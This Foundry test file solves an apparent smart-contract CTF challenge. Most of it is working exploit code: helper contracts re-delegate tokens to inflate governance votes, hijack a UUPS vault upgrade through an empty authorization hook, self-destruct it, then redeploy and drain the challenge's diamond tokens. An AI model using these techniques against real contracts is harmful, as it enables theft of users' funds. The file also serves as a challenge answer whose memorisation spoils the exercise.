// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import {Test, console, console2} from "forge-std/Test.sol";

import "../src/Challenge.sol";
import "../src/VaultFactory.sol";
import "../src/Vault.sol";
import "../src/Diamond.sol";
import "../src/HexensCoin.sol";


contract Repeat {
    address public player;
    constructor(address _player) public payable {
        player = _player;
    }

    function repeatVotes(HexensCoin hexenscoin) public {
        hexenscoin.delegate(address(this));
        hexenscoin.delegate(player);
        hexenscoin.transfer(player, hexenscoin.balanceOf(address(this)));
    }
}


contract Burner2 {

    function destruct(address player, Diamond diamond) external {
        diamond.transfer(player, diamond.balanceOf(address(this)));
    }
}

contract myVault is UUPSUpgradeable{
    Burner2 public burner;
    function pwn() public {
        selfdestruct(payable(address(this)));
    }

    function burn() public {
       burner = new Burner2();
    }

    function _authorizeUpgrade(address) internal override view {

    }
}



contract DiamondChallenge is Test {

    uint256 privateKey = vm.deriveKey("test test test test test test test test test test test junk",0);
    address public PLAYER = vm.addr(privateKey);
    // uint256 privateKey2 = vm.deriveKey("test test test test test test test test test test test ball", 0);
    // address public PLAYER2 = vm.addr(privateKey2);

    Challenge challenge;
    VaultFactory vaultFactory;
    Diamond diamond;
    HexensCoin hexensCoin;
    Vault vault;
    address public challenge_addr;



    function setUp() public {
        vm.label(PLAYER, "PLAYER");
        challenge_addr = address(new Challenge(PLAYER));
        challenge = Challenge(challenge_addr);
        vaultFactory  = challenge.vaultFactory();
        diamond = challenge.diamond();
        hexensCoin = challenge.hexensCoin();
        vault = challenge.vault();
    }



    function beforeTestSetup(
        bytes4 testSelector
    ) public pure returns (bytes[] memory beforeTestCalldata) {
        if (testSelector == this.testStageSuccess1.selector) {
            beforeTestCalldata = new bytes[](1);
            beforeTestCalldata[0] = abi.encodePacked(this.testStageSuccess0.selector);
        }
    }

    function testStageSuccess0() public {
        vm.startPrank(PLAYER);
        challenge.claim();
        uint256 hexenBalance = hexensCoin.balanceOf(PLAYER);
        console2.log("hexenBalance: ", hexenBalance);
        for (uint i = 0; i < 10; i++) {
            Repeat r = new Repeat(PLAYER);
            hexensCoin.transfer(address(r), hexenBalance);
            r.repeatVotes(hexensCoin);
        }

        uint32 nCheckpoints = hexensCoin.numCheckpoints(PLAYER);
        (uint32 fromBlock, uint256 votes) = hexensCoin.checkpoints(PLAYER, nCheckpoints - 1);
        console2.log("fromBlock: ", fromBlock);
        console2.log("votes: ", votes);
        bytes memory data = abi.encodeWithSignature("burn(address,uint256)", address(diamond), 31337);
        vault.governanceCall(data);


        myVault newvault = new myVault();
        console2.log("newvault: ", address(newvault));


        bytes memory upgradeNewVaultData = abi.encodeWithSignature(
            "upgradeTo(address)",
            address(newvault)
        );
        vault.governanceCall(upgradeNewVaultData);

        bytes memory selfDestructData = abi.encodeWithSignature("pwn()");
        address(vault).call(selfDestructData);

        vm.stopPrank();
    }

    function testStageSuccess1() public {

        vm.startPrank(PLAYER);
        uint256 hexenBalance = hexensCoin.balanceOf(PLAYER);
        console2.log("hexenBalance: ", hexenBalance);
        
        

        bytes32 salt = keccak256("The tea in Nepal is very hot. But the coffee in Peru is much hotter.");
        Vault newVault = vaultFactory.createVault(salt);
        newVault.initialize(address(diamond), address(hexensCoin));
        console2.log("newVault: ", address(newVault));

        myVault newVault2 = new myVault();
        bytes memory data = abi.encodeWithSignature(
            "upgradeTo(address)",
            address(newVault2)
        );
        newVault.governanceCall(data);


        myVault(address(newVault)).burn();
        Burner2 myburner = myVault(address(newVault)).burner();

        myburner.destruct(PLAYER,diamond);

        challenge.isSolved();

        vm.stopPrank();

    }
}